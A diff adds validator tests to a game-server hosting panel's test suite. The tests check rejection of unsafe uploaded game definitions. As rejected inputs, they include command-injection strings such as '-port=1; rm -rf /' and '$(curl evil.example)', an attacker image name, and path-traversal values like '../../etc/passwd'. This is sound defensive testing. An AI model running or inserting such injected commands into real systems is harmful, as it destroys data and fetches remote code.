@@ -41,6 +41,8 @@ const { CONFIG_FIELDS, getConfigValue, setConfigValue, unmappedConfigKeys } = aw
 const { hasDirectPublicAddress } = await import('../src/modules/network/nat-traversal.js');
 const { resetConfigForTests } = await import('../src/config/env.js');
 const { confirmStaticForwards } = await import('../src/modules/network/port-forwarder.js');
+const { validateGameDefinition, resolvePlaceholders } = await import('@asp/shared');
+const { builtInDefinitions } = await import('../src/modules/games/definitions.js');
 const {
   PANEL_PERMISSIONS,
   PANEL_PERMISSION_LABELS,
@@ -200,6 +202,145 @@ describe('Deployment detection', () => {
       }
     });
   }
+});
+
+describe('Game definitions', () => {
+  const valid = () => ({
+    id: 'my-game',
+    name: 'My Game',
+    shortName: 'MyGame',
+    install: { image: 'asp/steamcmd:latest', steamAppId: 123456, binary: 'MyGameServer' },
+    startup: { arguments: ['-port={{gamePort}}'] },
+    ports: [
+      { key: 'game', label: 'Game', protocol: 'udp', offset: 0, public: true },
+      { key: 'query', label: 'Query', protocol: 'udp', offset: 1, public: true },
+    ],
+    portStride: 10,
+    resources: {
+      minMemoryMib: 2048,
+      recommendedMemoryMib: 4096,
+      minCpuCores: 1,
+      minStorageGib: 10,
+    },
+  });
+
+  it('accepts a well-formed definition', () => {
+    const result = validateGameDefinition(valid());
+    assert.equal(result.valid, true, JSON.stringify(result.problems));
+  });
+
+  it('refuses an image the panel does not build', () => {
+    // The whole point of dropping the install-script field is that an upload
+    // cannot run code. An attacker-chosen image has its own entrypoint and
+    // would run just as happily, so the image is restricted too.
+    for (const image of ['evil/backdoor:latest', 'docker.io/evil/x', 'ubuntu']) {
+      const result = validateGameDefinition({ ...valid(), install: { ...valid().install, image } });
+      assert.equal(result.valid, false, `${image} should have been refused`);
+    }
+  });
+
+  it('refuses shell metacharacters in a startup argument', () => {
+    for (const argument of [
+      '-port=1; rm -rf /',
+      '-x=$(curl evil.example)',
+      '-y=`whoami`',
+      '-z=a|b',
+      '-w=a&b',
+    ]) {
+      const result = validateGameDefinition({
+        ...valid(),
+        startup: { arguments: [argument] },
+      });
+      assert.equal(result.valid, false, `"${argument}" should have been refused`);
+    }
+  });
+
+  it('refuses a placeholder that is not in the fixed set', () => {
+    const result = validateGameDefinition({
+      ...valid(),
+      startup: { arguments: ['-secret={{encryptionKey}}'] },
+    });
+    assert.equal(result.valid, false);
+    assert.match(JSON.stringify(result.problems), /encryptionKey/);
+  });
+
+  it('refuses a binary path that climbs out of the game directory', () => {
+    for (const binary of ['../../etc/passwd', 'a/../../b', '/bin/sh']) {
+      const result = validateGameDefinition({
+        ...valid(),
+        install: { ...valid().install, binary },
+      });
+      assert.equal(result.valid, false, `${binary} should have been refused`);
+    }
+  });
+
+  it('refuses ports that would make two servers collide', () => {
+    const result = validateGameDefinition({
+      ...valid(),
+      ports: [
+        { key: 'game', label: 'Game', protocol: 'udp', offset: 0, public: true },
+        { key: 'far', label: 'Far', protocol: 'udp', offset: 40, public: true },
+      ],
+      portStride: 10,
+    });
+    assert.equal(result.valid, false);
+    assert.match(JSON.stringify(result.problems), /overlap/);
+  });
+
+  it('requires a port players can connect to', () => {
+    const result = validateGameDefinition({
+      ...valid(),
+      ports: [{ key: 'query', label: 'Query', protocol: 'udp', offset: 0, public: true }],
+    });
+    assert.equal(result.valid, false);
+    assert.match(JSON.stringify(result.problems), /players connect to/);
+  });
+
+  it('refuses duplicate port keys and offsets', () => {
+    const duplicateKeys = validateGameDefinition({
+      ...valid(),
+      ports: [
+        { key: 'game', label: 'A', protocol: 'udp', offset: 0, public: true },
+        { key: 'game', label: 'B', protocol: 'udp', offset: 1, public: true },
+      ],
+    });
+    assert.equal(duplicateKeys.valid, false);
+
+    const duplicateOffsets = validateGameDefinition({
+      ...valid(),
+      ports: [
+        { key: 'game', label: 'A', protocol: 'udp', offset: 0, public: true },
+        { key: 'query', label: 'B', protocol: 'udp', offset: 0, public: true },
+      ],
+    });
+    assert.equal(duplicateOffsets.valid, false);
+  });
+
+  it('refuses an adapter that does not exist', () => {
+    const result = validateGameDefinition({ ...valid(), adapter: 'not-a-real-adapter' });
+    assert.equal(result.valid, false);
+  });
+
+  it('warns rather than fails when there is no adapter', () => {
+    const result = validateGameDefinition({ ...valid(), adapter: null });
+    assert.equal(result.valid, true);
+    assert.match(result.warnings.join(' '), /player count|RCON|config/i);
+  });
+
+  it('resolves only the placeholders it is given', () => {
+    assert.equal(
+      resolvePlaceholders('-port={{gamePort}} -name={{unknown}}', { gamePort: 2302 }),
+      '-port=2302 -name={{unknown}}',
+    );
+  });
+
+  it('every built-in title survives its own schema', () => {
+    // A shipped definition that fails validation would take the whole games
+    // list down at startup, so it is asserted rather than assumed.
+    assert.doesNotThrow(() => builtInDefinitions());
+    const ids = builtInDefinitions().map((d) => d.id).sort();
+    assert.deepEqual(ids, ['arma3', 'arma4', 'reforger']);
+  });
 });
 
 describe('Panel permissions', () => {
